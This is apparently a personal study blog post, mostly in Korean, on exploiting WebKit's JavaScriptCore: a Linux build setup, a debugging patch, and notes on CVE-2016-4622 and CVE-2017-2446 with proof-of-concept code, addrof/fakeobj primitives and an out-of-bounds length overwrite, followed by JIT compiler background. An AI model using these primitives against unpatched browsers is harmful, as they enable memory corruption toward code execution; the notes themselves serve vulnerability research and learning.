---
layout: post
title: JavaScriptCore Case Study
subtitle: Before Study backup
tags: [JS, Study, Backup, BrowserExploit]
---

I made this repository to help other peoples who struggle to learn about JS Engine Exploitation. Most of JavaScriptCore CVE and CTF challenges are based on OS X. But most of my friends don't have Mac. And OS X in Virtual Machine make terrible performance, so I tried to made those challenges in Linux.

# Environment

Ubuntu 18.04.2 LTS 64bit

every challenge is based on commit [cb9ca26b04e1c7fe4976916b4c50cbb093c71a9f](https://github.com/WebKit/webkit/commit/cb9ca26b04e1c7fe4976916b4c50cbb093c71a9f)

# Execute

```
$ unzip $(challenge_name_here).zip -d $(challenge_name_here)
$ cd $(challenge_name_here)/
$ LD_LIBRARY_PATH=./lib ./bin/jsc

```

# Build

```
# add functionDbg() at Source/JavaScriptCore/jsc.cpp

$ sudo apt install libicu-dev python ruby bison flex cmake build-essential ninja-build git gperf
$ git clone git://git.webkit.org/WebKit.git && cd WebKit
$ Tools/gtk/install-dependencies
$ CFLAGS=-g CXXFLAGS=-g Tools/Scripts/build-webkit --jsc-only --release
$ cd WebKitBuild/Release
$ LD_LIBRARY_PATH=./lib bin/jsc # check it

# Delete WebKitBuild for clean rebuild

```

( quoted from [https://github.com/m1ghtym0/browser-pwn#build-ubuntu-1804](https://github.com/m1ghtym0/browser-pwn#build-ubuntu-1804) )

# dbg tool

```
diff --git diff --git a/Source/JavaScriptCore/jsc.cpp b/Source/JavaScriptCore/jsc.cpp
index bda9a09d0d2..d359518b9b6 100644
--- a/Source/JavaScriptCore/jsc.cpp
+++ b/Source/JavaScriptCore/jsc.cpp
@@ -994,6 +994,7 @@ static EncodedJSValue JSC_HOST_CALL functionSetHiddenValue(ExecState*);
 static EncodedJSValue JSC_HOST_CALL functionPrintStdOut(ExecState*);
 static EncodedJSValue JSC_HOST_CALL functionPrintStdErr(ExecState*);
 static EncodedJSValue JSC_HOST_CALL functionDebug(ExecState*);
+static EncodedJSValue JSC_HOST_CALL functionDbg(ExecState*);
 static EncodedJSValue JSC_HOST_CALL functionDescribe(ExecState*);
 static EncodedJSValue JSC_HOST_CALL functionDescribeArray(ExecState*);
 static EncodedJSValue JSC_HOST_CALL functionSleepSeconds(ExecState*);
@@ -1218,6 +1219,7 @@ protected:

         addFunction(vm, "debug", functionDebug, 1);
         addFunction(vm, "describe", functionDescribe, 1);
+        addFunction(vm, "dbg", functionDbg, 0);
         addFunction(vm, "describeArray", functionDescribeArray, 1);
         addFunction(vm, "print", functionPrintStdOut, 1);
         addFunction(vm, "printErr", functionPrintStdErr, 1);
@@ -1752,6 +1754,13 @@ EncodedJSValue JSC_HOST_CALL functionDebug(ExecState* exec)
     return JSValue::encode(jsUndefined());
 }

+EncodedJSValue JSC_HOST_CALL functionDbg(ExecState* exec)
+{
+       asm("int3;");
+
+       return JSValue::encode(jsUndefined());
+}
+
 EncodedJSValue JSC_HOST_CALL functionDescribe(ExecState* exec)
 {
     if (exec->argumentCount() < 1)

```

```
dbg(); // examine the memory layout
foo(); // do something
dbg(); //see how things have changed

>>> a = [0x41, 0x42];
65,66
>>> describe(a);
Object: 0x7fc5663b01f0 with butterfly 0x7fc5663caec8 (0x7fc5663eac20:[Array, {}, ArrayWithInt32, Proto:0x7fc5663e4140, Leaf]), ID: 88
>>> describeArray(a);
<Butterfly: 0x7fc5663caec8; public length: 2; vector length: 3>

```

인라인 가끔 안 맞으니깐 patch 돌리지 말고 그냥 인라인 추가하면 될듯? `describe` 함수랑 `describeArray` 함수 유용하게 쓰일듯?

WebKit ships with a script for macOS to dump the object layout of various classes, for example, here is JSC::JSString:

```
b4sh5i@webkit:~/WebKit/Tools/Scripts$ ./dump-class-layout JSC JSString
Found 1 types matching "JSString" in "/home/b4sh5i/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so"
  +0 { 24} JSString
  +0 {  8}     JSC::JSCell
  +0 {  1}         JSC::HeapCell
  +0 <  4>         JSC::StructureID m_structureID;
  +4 <  1>         JSC::IndexingType m_indexingTypeAndMisc;
  +5 <  1>         JSC::JSType m_type;
  +6 <  1>         JSC::TypeInfo::InlineTypeFlags m_flags;
  +7 <  1>         JSC::CellState m_cellState;
  +8 <  4>     unsigned int m_flags;
 +12 <  4>     unsigned int m_length;
 +16 <  8>     WTF::String m_value;
 +16 <  8>         WTF::RefPtr<WTF::StringImpl> m_impl;
 +16 <  8>             WTF::StringImpl * m_ptr;
Total byte size: 24
Total pad bytes: 0

```

This script required minor modifications to run on linux, but it was quite useful later on.

# Table

1. CVE-2016-4622 (Found by [Samuel Groß](https://twitter.com/5aelo))
    - arrayProtoFuncSlice & arrayProtoFuncSplice Out-Of-Bound
    - [patch commit](https://github.com/WebKit/webkit/commit/650552a6ed7cac8aed3f53dd464341728984b82f)
    - [Proof-of-Concept Code](https://github.com/tunz/js-vuln-db/blob/master/jsc/CVE-2016-4622.md)
    - [Attacking JavaScript Engines](http://phrack.org/papers/attacking_javascript_engines.html)
    - [Attacking JavaScript Engines Korean Verion](https://null2root.github.io/blog/2019/04/06/Attacking-JavaScript-Engines-kor.html)
    - [Download](https://mega.nz/#!1ypkjAbY!hd2y5BfvmcOPs9a5nboIxFRth184UdP1rsbxZmzjdQ0)
2. CVE-2017-2446 (Found by [Natalie Silvanovich](https://twitter.com/natashenka))
    - Function.caller Type Confusion
    - [patch commit](https://github.com/WebKit/webkit/commit/f7303f96833aa65a9eec5643dba39cede8d01144)
    - [Proof-of-Concept Code](https://github.com/tunz/js-vuln-db/blob/master/jsc/CVE-2017-2446.md)
    - [CVE-2017-2446 or JSC::JSGlobalObject::isHavingABadTime](https://doar-e.github.io/blog/2018/07/14/cve-2017-2446-or-jscjsglobalobjectishavingabadtime/)
    - [@natashenka's p0 bug tracker](https://bugs.chromium.org/p/project-zero/issues/detail?id=1032)
    - [Download](https://mega.nz/#!Zm4mAYbR!VYg-V2SIias82zYt8tk4DL-ju1YOfItP9aZmKGa8z9I)
3. CVE-2018-4233 (Found by [Samuel Groß](https://twitter.com/5aelo))
    - CreateThis JIT side effect Type Confusion
    - [patch commit](https://github.com/WebKit/webkit/commit/b602e9d167b2c53ed96a42ed3ee611d237f5461a)
    - [Proof-of-Concept Code](https://github.com/tunz/js-vuln-db/blob/master/jsc/CVE-2018-4233.md)
    - [CVE-2018-4233 github repository](https://github.com/saelo/cve-2018-4233)
    - [CVE-2018-4233 brief explanation](https://github.com/saelo/pwn2own2018#stage-0)
    - [Download](https://mega.nz/#!w7pCjSbQ!tGpBAWVtFgJdvgPCX9P2FMkwL7xOT0AWB2TmPcRY1nA)
4. CVE-2019-8558 (Found by [Samuel Groß](https://twitter.com/5aelo))
    - ????
    - [patch commit](https://github.com/WebKit/webkit/commit/44b1bcefcada71e27ed921241486e99683b28207)
    - [Proof-of-Concept Code](https://github.com/tunz/js-vuln-db/blob/master/jsc/CVE-2019-8558.md)
    - [CVE-2019-8558 brief explanation](https://github.com/tunz/js-vuln-db/blob/master/jsc/CVE-2019-8558.md)
    - [@5aelo's p0 bug tracker](https://bugs.chromium.org/p/project-zero/issues/detail?id=1783)
    - [Download](https://mega.nz/#!o3o1gSqJ!o3fZXoJmzBvqg3aCN5qm0OegWdMMG9pxykCchM0xahg)

# Extra

moar JavaScriptCore CVEs:

- [https://github.com/tunz/js-vuln-db#javascriptcore](https://github.com/tunz/js-vuln-db#javascriptcore)

Fuzzilli - A JavaScript Engine Fuzzer:

- [https://github.com/googleprojectzero/fuzzilli](https://github.com/googleprojectzero/fuzzilli)
- [https://saelo.github.io/presentations/offensivecon_19_fuzzilli.pdf](https://saelo.github.io/presentations/offensivecon_19_fuzzilli.pdf)
- [https://saelo.github.io/papers/thesis.pdf](https://saelo.github.io/papers/thesis.pdf)
- [https://www.youtube.com/watch?v=OHjq9Y66yfc](https://www.youtube.com/watch?v=OHjq9Y66yfc)

CodeAlchemist - Semantics-aware Code Generation for Finding JS engine Vulnerabilities

- [https://github.com/SoftSec-KAIST/CodeAlchemist](https://github.com/SoftSec-KAIST/CodeAlchemist)
- [https://daramg.gift/paper/han-ndss2019.pdf](https://daramg.gift/paper/han-ndss2019.pdf)
- [https://www.ndss-symposium.org/wp-content/uploads/ndss2019_05A-5_Han_slides.pdf](https://www.ndss-symposium.org/wp-content/uploads/ndss2019_05A-5_Han_slides.pdf)
- [https://www.youtube.com/watch?v=OB2kN-3vrh4](https://www.youtube.com/watch?v=OB2kN-3vrh4)

LiveOverflow's Browser Exploitation Video Tutorial:

- [https://www.youtube.com/playlist?list=PLhixgUqwRTjwufDsT1ntgOY9yjZgg5H_t](https://www.youtube.com/playlist?list=PLhixgUqwRTjwufDsT1ntgOY9yjZgg5H_t)
- [https://liveoverflow.com/tag/browser-exploitation/](https://liveoverflow.com/tag/browser-exploitation/)

# TroubleShooting

```
# ./bin/jsc: error while loading shared libraries: libicui18n.so.52: cannot open shared object file: No such file or directory
$ sudo dpkg -i troubleshooting/libicu52_52.1-3ubuntu0.4_amd64.deb

```

# notepad

## CVE-2016-4622

Attacking JavaScript Engines Korean Verion 정독 끗 > 디버깅 필요함
poc 새로 짜고 대충 addrof 랑 fakeobj 어떻게 조지는지 요약 정리 따로 해야대나? 흠;

```
function poc(){
	var a = [];
	for (var i = 0; i < 100; i++)
	    a.push(i + 0.123);

	var b = a.slice(0, {valueOf: function() { a.length = 0; return 10; }});
	// b = [0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0]
}

function addrof(object) {
    var a = [];
    for (var i = 0; i < 100; i++)
        a.push(i + 0.1337);   // 배열의 타입이 반드시 ArrayWithDouble 여야 함

    var hax = {valueOf: function() {
        a.length = 0;
        a = [object];
        return 4;
    }};

    var b = a.slice(0, hax);
    return Int64.fromDouble(b[3]);
}

function fakeobj(addr) {
    var a = [];
    for (var i = 0; i < 100; i++)
        a.push({});     // 배열의 타입이 반드시 ArrayWithContiguous 여야 함
    addr = addr.asDouble();

    var hax = {valueOf: function() {
        a.length = 0;
        a = [addr];
        return 4;
    }};

    return a.slice(0, hax)[3];
}

```

중요 포인트는 `arrayProtoFuncSlice` 함수로 `fastSlice` 시에 추가적인 bound 검사를 하지 않는 것이 첫번째 드래서 해당과 같이 poc 가 나옴.
그 다음이 `valueOf` 개념인데 여기서 객체를 숫자(primitive types)로 변환하는 규칙이 흥미롭다.
객체에 “valueOf” 라는 호출 가능한 속성 property이 있는 경우 이 메소드를 호출하여 결과가 원시 값(primitive value)인 경우 이 값을 그대로 사용한다.

```
Math.abs({valueOf: function() { return -42; }});
// 42

```

그래서 다음과 같이 결과가 나온다. 이 부분은 좀 더 보면서 디버깅 필요하니깐 [링크](https://null2root.github.io/blog/2019/04/06/Attacking-JavaScript-Engines-kor.html#23--valueof%EB%A1%9C-%EA%B3%B5%EA%B2%A9%ED%95%98%EA%B8%B0) 참고하자.

+) 좀 추가로 정리.
`arrayProtoFuncSlice` 함수 호출 시 범위 지정을 위해 전달된 파라미터(숫자 객체)는 `argumentClampedIndexFromStartOrEnd` 함수 내에서 primitive 타입 으로 변환된다. 또한 이 함수 안에서 인자값의 범위가 (0, length)로 고정된다.

```
    JSValue value = exec->argument(argument);
    if (value.isUndefined())
        return undefinedValue;

    double indexDouble = value.toInteger(exec);  // 타입 변환이 발생하는 부분
    if (indexDouble < 0) {
        indexDouble += length;
        return indexDouble < 0 ? 0 : static_cast<unsigned>(indexDouble);
    }
    return indexDouble > length ? length :
                                  static_cast<unsigned>(indexDouble);

```

만약 `slice` 를 호출할 때 `valueOf` 함수를 통해 배열의 `length 속성`을 바꾼다면, slice 의 내부에서는 바꾸기 전의 length 값을 계속 사용할 것이고, 이는 memcpy가 실행되는 시점에 Out-Of-Bounds Access(이하 OOB Access)로 이어질 것이다.

```
// @@ -863,7 +863,7 @@ EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)
    if (UNLIKELY(speciesResult.first == SpeciesConstructResult::Exception))
        return JSValue::encode(jsUndefined());

    //if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath && isJSArray(thisObj))) {
    if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath && isJSArray(thisObj) && length == getLength(exec, thisObj))) {
        if (JSArray* result = asArray(thisObj)->fastSlice(*exec, begin, end - begin))
            return JSValue::encode(result);
    }

```

```
// @@ -932,7 +932,7 @@ EncodedJSValue JSC_HOST_CALL arrayProtoFuncSplice(ExecState* exec)
        return JSValue::encode(jsUndefined());

    JSObject* result = nullptr;
    //if (speciesResult.first == SpeciesConstructResult::FastPath && isJSArray(thisObj))
	if (speciesResult.first == SpeciesConstructResult::FastPath && isJSArray(thisObj) && length == getLength(exec, thisObj))
        result = asArray(thisObj)->fastSlice(*exec, begin, deleteCount);

    if (!result) {

```

`argumentClampedIndexFromStartOrEnd` 함수에서 처리할때 length 속성만 좀 생각하고 하면 될꺼 위의 [코드 패치](https://github.com/WebKit/webkit/commit/650552a6ed7cac8aed3f53dd464341728984b82f)보면 `fastSlice` 에 대한 길이값 검증만 추가됨.

그 이외에 JSC 힙, 가비지 컬렉터 좀 보고 공부하고 요약 필요할듯?

## CVE-2017-2446

```
var q;
// this is a non-strict chunk of code, so getting the caller is allowed
function g(){
    q = g.caller;
    return 7;
}

var a = [1, 2, 3];
a.length = 4;
// when anything, including the runtime, accesses a[3], g will be called
Object.defineProperty(Array.prototype, "3", {get : g});
// trigger the runtime access of a[3]
[4, 5, 6].concat(a);
// q now is a reference to an internal runtime function
q(0x77777777, 0x77777777, 0); // crash

```

you called from a strict function to a non-strict function, JSC would allow you to get a reference to the strict function.

```
function concat(first)
{
    "use strict";

    // [1] perform some input validation
    if (@argumentCount() === 1
        && @isJSArray(this)
        && this.@isConcatSpreadableSymbol === @undefined
        && (!@isObject(first) || first.@isConcatSpreadableSymbol === @undefined)) {

        let result = @concatMemcpy(this, first); // [2] call the fastpath
        if (result !== null)
            return result;
    }

    // … snip ...

```

POC 에서 중요한게 `[4, 5, 6].concat(a);` 이 부분이다. `concat` 함수 실행시에 `strict function` 로 Array 읽어와서 strict 타입으로 바꾼다. 이때 dst array 과 src array 의 데이터 타입이 array 이면 `fastpath` 으로 복사를 하게 된다.
그리고 @ 는 사용자 코드가 아닌 웹킷과 함께 제공되는 JavaScript 런타임을 통해서만 호출 할 수 있다. 여기서 중요한 `@concatMemcpy` 함수는 `Source/JavaScriptCore/runtime/ArrayPrototype.cpp` 에 있는 `arrayProtoPrivateFuncAppendMemcpy` 함수에서 찾아 볼 수 있다.

```
EncodedJSValue JSC_HOST_CALL arrayProtoPrivateFuncAppendMemcpy(ExecState* exec)
{
    ASSERT(exec->argumentCount() == 3);

    VM& vm = exec->vm();
    JSArray* resultArray = jsCast<JSArray*>(exec->uncheckedArgument(0));
    JSArray* otherArray = jsCast<JSArray*>(exec->uncheckedArgument(1));
    JSValue startValue = exec->uncheckedArgument(2);
    ASSERT(startValue.isAnyInt() && startValue.asAnyInt() >= 0 && startValue.asAnyInt() <= std::numeric_limits<unsigned>::max());
    unsigned startIndex = static_cast<unsigned>(startValue.asAnyInt());
    if (!resultArray->appendMemcpy(exec, vm, startIndex, otherArray)) // [3] fastpath...
        moveElements(exec, vm, resultArray, startIndex, otherArray, otherArray->length());

    return JSValue::encode(jsUndefined());
}

```

무튼 중요한건 `appendMemcpy` 함수인데 해당 함수는 [/Source/JavaScriptCore/runtime/JSArray.cpp#L474](https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/JavaScriptCore/runtime/JSArray.cpp#L474) 에서 확인 할 수 있다.

```
bool JSArray::appendMemcpy(ExecState* exec, VM& vm, unsigned startIndex, JSC::JSArray* otherArray)
{
    // … snip ...

    unsigned otherLength = otherArray->length();
    unsigned newLength = startIndex + otherLength;
    if (newLength >= MIN_SPARSE_ARRAY_INDEX)
        return false;

    if (!ensureLength(vm, newLength)) { // [4] check dst size
        throwOutOfMemoryError(exec, scope);
        return false;
    }
    ASSERT(copyType == indexingType());

    if (type == ArrayWithDouble)
        memcpy(butterfly()->contiguousDouble().data() + startIndex, otherArray->butterfly()->contiguousDouble().data(), sizeof(JSValue) * otherLength);
    else
        memcpy(butterfly()->contiguous().data() + startIndex, otherArray->butterfly()->contiguous().data(), sizeof(JSValue) * otherLength); // [5] do the concat

    return true;
}

```

여기서 보면 dst 의 사이즈를 체크 하고 if (type == ArrayWithDouble) 진행 이후에 memcpy 를 하게 된다. 이때 dst 의 할당된 사이즈가 dst 와 src 사이즈를 더한 값 보다 작으면 dst 를 리사이즈 하고 memcpy 를 시도한다. 대충 풀어쓰면 ...

```
# JS Array.concat
def concat(dst, src):
    if typeof(dst) == Array and typeof(src) == Array: concatFastPath(dst, src)
    else: concatSlowPath(dst, src)

# C++ concatMemcpy / arrayProtoPrivateFuncAppendMemcpy
def concatFastPath(dst, src):
    appendMemcpy(dst, src)

# C++ appendMemcpy
def appendMemcpy(dst, src):
    if allocated_size(dst) < sizeof(dst) + sizeof(src):
        resize(dst)
    memcpy(dst + sizeof(dst), src, sizeof(src))

```

아니 근데 문서 보니깐 직역으로 보니 `[1]` 에서 검증을 무시하고 `arrayProtoPrivateFuncAppendMemcpy` 를 강제로 호출 할 수 있다 라고 하는데 ... 내가 보기엔 웹킷의 js 함수에서 딱히 별 다른 검증이 없고 타입이 array 이면 그냥 무시하고 넘기는거 같아서 터지는거 같다. 코드 오디팅 능력 딸려서 맞는지 안맞는지 모르겠지만 암튼 그런거 같다..

```
x@webkit:~/WebKit/Tools/Scripts$ ./dump-class-layout JSC JSArray
Found 1 types matching "JSArray" in "/home/x/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so"
  +0 { 16} JSArray
  +0 { 16}     JSC::JSNonFinalObject
  +0 { 16}         JSC::JSObject
  +0 {  8}             JSC::JSCell
  +0 {  1}                 JSC::HeapCell
  +0 <  4>                 JSC::StructureID m_structureID;
  +4 <  1>                 JSC::IndexingType m_indexingTypeAndMisc;
  +5 <  1>                 JSC::JSType m_type;
  +6 <  1>                 JSC::TypeInfo::InlineTypeFlags m_flags;
  +7 <  1>                 JSC::CellState m_cellState;
  +8 <  8>             JSC::AuxiliaryBarrier<JSC::Butterfly *> m_butterfly;
  +8 <  8>                 JSC::Butterfly * m_value;
Total byte size: 16
Total pad bytes: 0

```

존나 뭐지 시팔 타입을 몰라서 그런가 ,,, 라고 생각들때 `JSArray` 설명을 해주신다. 무섭누; 암튼 아까 위에서 `butterfly()->contiguous().data() + startIndex` 를 dst array 인자로 넣어주는데, 이때 `butterfly()` 가 내부적으로 `contiguous().data()` 을 사라지게 해준다. 해당 설명은 CVE-2016-4622 이거 프렉 문서 보라고 하는데 존나 그냥 좀 써주지 너무하네; 어짜피 익스하면서 봐야하는데 나중에 다시 공부해봐야겠다. 암튼 요약하면 `memcpy(qword ptr [obj + 8], qword ptr [src + 8], sizeof(src))` 이꼴난다. 그래서 타입 컴퓨전 터지는갑다.

결론은 임의의 포인터에 임의의 값을 쓰는 꼴이 된다. 이제 문제는 +8 부분인 butterfly 영역에 쓸 수 있는 오브젝트가 필요한데 ...

```
x@webkit:~/WebKit/Tools/Scripts$ ./dump-class-layout JSC Symbol
Found 1 types matching "Symbol" in "/home/x/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so"
  +0 { 16} Symbol
  +0 {  8}     JSC::JSCell
  +0 {  1}         JSC::HeapCell
  +0 <  4>         JSC::StructureID m_structureID;
  +4 <  1>         JSC::IndexingType m_indexingTypeAndMisc;
  +5 <  1>         JSC::JSType m_type;
  +6 <  1>         JSC::TypeInfo::InlineTypeFlags m_flags;
  +7 <  1>         JSC::CellState m_cellState;
  +8 <  8>     JSC::PrivateName m_privateName;
  +8 <  8>         WTF::Ref<WTF::SymbolImpl> m_uid;
  +8 <  8>             WTF::SymbolImpl * m_ptr;
Total byte size: 16
Total pad bytes: 0

```

위의 심볼을 보면 non-butterfly 포인터가 +8 부분에 정확히 있는 것을 볼 수 있다. 또 JSCell 의 구조체 때문에 검사를 bypass 가 가능해, memcpy 를 유도할 수 있다. 이제 해당 심볼을 이용해 릭 할 방법을 다이어그램으로 짜보자. `WTF::SymbolImpl’s` 레이아웃은 다음과 같다.

```
x@webkit:~/WebKit/Tools/Scripts$ ./dump-class-layout WTF SymbolImpl
Found 1 types matching "SymbolImpl" in "/home/x/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so"
  +0 { 48} SymbolImpl
  +0 { 24}     WTF::UniquedStringImpl
  +0 { 24}         WTF::StringImpl
  +0 <  4>             unsigned int m_refCount;
  +4 <  4>             unsigned int m_length;
  +8 <  8>             WTF::StringImpl::(anonymous union) None;
 +16 <  4>             unsigned int m_hashAndFlags;
 +20 <  4>             <PADDING>
 +20 <  4>         <PADDING>
 +20 <  4>     <PADDING>
 +24 <  8>     WTF::StringImpl * m_owner;
 +32 <  8>     WTF::SymbolRegistry * m_symbolRegistry;
 +40 <  4>     unsigned int m_hashForSymbol;
 +44 <  4>     unsigned int m_flags;
Total byte size: 48
Total pad bytes: 12
Padding percentage: 25.00 %

```

```
       -8   -4     +0  +8  +16
+---------------------+---+-----------+
|pub length|length| 0 | 1 | 2 |...| n |
+---------------------+---+-----------+
                  ^
+-------------+   |
|butterfly ptr+---+
+-------------+

```

원래 진행중인 코드에서는 위의 메모리 레이아웃와 같이 단순화 된 butterfly 포인터가 필요하다.

```
                    +0       +4     +8
+-----------------------------------------------+
|       OOB        |refcount|length|str base ptr|
+-----------------------------------------------+
                   ^
+--------------+   |
|SymbolImpl ptr+---+
+--------------+

```

하지만 우리는 다음과 같은 메모리 맵이 존재한다.

```
def appendMemcpy(dst, src):
    if allocated_size(dst) < sizeof(dst) + sizeof(src):
        resize(dst)

    memcpy(dst + sizeof(dst), src, sizeof(src));

```

일반적인 butterfly 경우엔 butterfly 포인터에서 -4 에서 -8 에 있는 `public length` 와 `lenght` 를 체크한다. 하지만 `type confused` 된 심볼의 경우엔 array 의 범위를 초과해 oob 를 유발할 수 있다. 이제 oob 를 통해 메모리를 컨트롤 해보자.

```
  OOB    OOB
+------------------------------------------+
|0xffff|0xffff|refcount|length|str base ptr|
+------------------------------------------+
              ^
        +---+ |
        |ptr+-+
        +---+

```

In this case, resize in our pseudocode or ensureLength ([4]) in the actual code will not trigger a reallocation and object move, resulting in a direct memcpy on top of refcount and length. 암튼 lenght 필드를 덮어서 oob 트리거 만드수가 있다고 하는디 ..

```
let x = Symbol("AAAA");

let y = [];
y.push(new Int64('0x000042420000ffff').asDouble());

busted_concat(x, y, 0);

```

다음과 같이 oob 트리거를 구현해 봤다. 이제 x 의 심볼 테이블을 한번 까보면. 여기서 Int64 함수는 [모듈](https://github.com/saelo/jscpwn/blob/master/int64.js) 써서 구현하였음.

```
 refcount length
+----------------------------+
| 0x4242 |0xffff|str base ptr|
+----------------------------+

```

다음과 같이 바뀐것을 확인 할 수 있다. 이제 length 를 덮었기 때문에 oob 로 addrof 나 fakeobj 만들어서 익스하면 끝이겠다. 익스하는 방법은 나중에.

# CVE-2018-4233

일단 [링크](https://saelo.github.io/presentations/blackhat_us_18_attacking_client_side_jit_compilers.pdf) 이것부터 보는거로 ~
JIT 이해하고 그 다음에 넘어가야할듯. 읽는 김에 정독하면서 앞부분 복습

좀 중구난방으로 뛰긴 하는데 정리.

## Builtins

```
var a = [1,2,3];
a.slice(1,2);
// [2]

```

Builtins 는 엔진 자체에 구현되어 있는 스크립트를 의미한다. 위 코드에선 당연히 `slice` 가 Builtin 함수가 된다. 이러한 엔진은 C++, js, asm, jit compiler(v8 의 turbofan) 등등 다양한 방법으로 구현되어있다. 저 js 코드를 `JSC` 예시로 들어보면 C++ 로 구현되어 있으며 다음과 같이 구현되어 있다.

```
EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec) {
    // <https://tc39.github.io/ecma262/#sec-array.prototype.slice>
    VM& vm = exec->vm();
    auto scope = DECLARE_THROW_SCOPE(vm);
    ...; 

```

Builtins 의 가장 많은 취약점은 3가지 정도로 뽑을 수 있는데, `Unexpected callbacks` 예기치 않은 콜백, `Integer related issues` 인티저 문제, `Use-after-frees (missing GC rooting)` GC 처리중 UAF 정도가 있다고 이야기한다.

## JSValues

```
var a = 42;
a = "foo";
a = {};

var o = {};
o.a = 42;
o.a = "foo";
o.a = {};

```

JS 의 경우, 동적으로 타입이 지정된다. 이는 컴파일 이후에 값이 정해지는 것이 아닌 런타임 분기로 타입이 결정된다. 이때 타입 정보와 값 정보를 함께 저장을 해야대는 문제가 생기는데 이를 대처하기 위해 `8 byte` 단위로 값을 저장한다. 해당 내용은 CVE 정리한 것 중에 참고하면 조을듯? 프렉에 내용 쓰면 될것.

```
0x0000004200000000
    1-bit cleared => a SMI
    Payload in the upper 32 bits (0x42)

0x00000e0359b8e611
    1-bit set => a pointer to an object located
    at address 0x00000e0359b8e610

```

일반적으로 `NaN-boxing` 이나 `pointer tagging` 으로 접근한다. `v8` 로 예를 들면, 1비트가 지워지면 32비트 작은 정수를 의미하고, 반대로 1 비트가 설정되면 일부 객체에 대한 포인터며 역 참조가 가능해진다.

## JSObjects

```
var o1 = {
    x: 0x41,
    y: 0x42
};
var o2 = {
    x: 0x1337,
    y: 0x1338
}

```

JS 객체의 경우, 속성값과 속성 이름을 `shape *` 객체에 이름과 위치를 저장한다.

```
Obj 1              <x>  Obj 1
- properties:           - shape --------> Shape 1
    "x" -> 0x41         - slots:      │   - properties
    "y" -> 0x42             0: 0x41   │      "x" -> slot 0
                            1: 0x42   │      "y" -> slot 1
                                      │                                    
                        Obj 2         │
                        - shape ------┘
                        - slots:
                            0: 0x1337
                            1: 0x1338

```

간단하게 그림으로 요약하면, 값 자체는 따로 저장해 모양이 비슷한 객체끼리 공유되어 사용된다고 생각하면된다. 만약에 해당 코드에서 `o1.z = 0x43` 처럼 추가적으로 들어오게 되면 `shape 2` 객체가 생성되면서 다른 공유 오브젝트를 가리키게된다. 또 만약에 `o2.z = 0x1339` 처럼 또 추가되면 다시금 `shape 1` 객체는 사라지고 둘다 2번을 가리키고 있을 것 이다.

## JIT

보통의 인터프리터에선 타입이 지정된 상태로 값을 처리하는데 JS 에선 매개 변수의 타입에 대해 모르는 함수가 많다. 이는 특히 구조체에서 더 골때리는데, 만약 이전에 설명한 대로라면 모르는 구조체가 등장시에 공유 오브젝트를 어떻게 알 수 있냐는 것이다. 이땐 속성이 inline, out-of-line 혹은 프로토타입 에서 getter 혹은 proxy 일 수도 있다. 그래서 동적 언어를 컴파일 하는데 있어 JIT 의 주요 과제는 `missing type information` 이라고 할 수 있다.

```
function add(a: Smi, b: Smi) {
    return a + b;
}
/*
lea rax, [rdi+rsi]
jo bailout_overflow
ret
*/

function foo(o: MyObj) {
    return o.b;
}
/*
mov rax, [rdi+0x20]
ret
*/

```

No integer overflows in JavaScript, so might need to bailout (mechanism to resume execution in a lower tier) and convert to doubles in the interpreter.

## Obtaining Type Information

하지만 우린 인자의 타입을 모른다. 그러나 JIT 컴파일시에 이전 호출의 인자의 타입을 알고 있다. 그렇기 때문에 인터프리터 혹은 `baseline JIT` 에서 발견된 타입을 추적할 수 있다. 예를 들어

```
add(123,456)
add(567,789)
add(123123,453465)

```

해당 같은 꼴로 add 함수가 존재하면 항상 정수인 `SMIs` 를 인수로 사용하여 호출 할 것이다.

## Code Generation

그럼 두가지 의문점이 생긴다.

- 모든 변수에 대한 타입 추론
- JIT 컴파일에 어떻게 적용할지

```
; Ensure has expected Shape
cmp QWORD PTR [rdi], 0x12345601
jne bailout

; Ensure is SMI
test rdi, 0x1
jnz bailout

```

두가지를 해결하기 위해 `Speculation guards + code for known types` 를 시도하면 된다.

```
function add(a, b) {
    return a + b;
}
/*
; Ensure a and b are SMIs
test rdi, 0x1
jnz bailout_not_smi
test rsi, 0x1
jnz bailout_not_smi

; Perform operation for SMIs
lea rax, [rdi+rsi]
jo bailout_overflow
ret
*/

```

이전의 인티저(SMIs) 의 예시.

```
function foo(o) {
    return o.b;
}
/*
; Ensure o is not a SMI
test rdi, 0x1
jz bailout_not_object

; Ensure o has the expected Shape
cmp QWORD PTR [rdi], 0x12345601
jne bailout_wrong_shape

; Perform operation for known Shape
mov rax, [rdi+0x20]
ret
*/

```

이전의 오브젝트의 예시. 그렇다면 우린 타입의 정보를 알 수 있다. 자 `missing type information` 를 정리해보자.

1. interpreter / baseline JIT 에서 런타임 동작 확인
2. 같은 유형으로 보이는 것을 Speculate
3. 여러 유형의 runtime guards 를 사용한 Guard speculations
4. 그래프 IL 를 최적화 하고 기계 코드로 추출

# JIT Compiler Attack Surface

ppt 에서는 대충 아웃라인으로 다음과 같이 추측했다.

```
1. Memory corruption bugs in the compiler
2. "Classic" bugs in slow-path handlers
3. Bugs in code generators
4. Incorrect optimizations
5. Everything else

```

가장 위가 원초적인 버그라 칭하면 아래로 내려갈수록 JIT 컴파일러에서 발생하는 특별한 버그라고 생각하면 된다. 1번의 경우에는 늘 보는 OOB 취약점이 대부분이라 pass.

## Slow-path Handlers
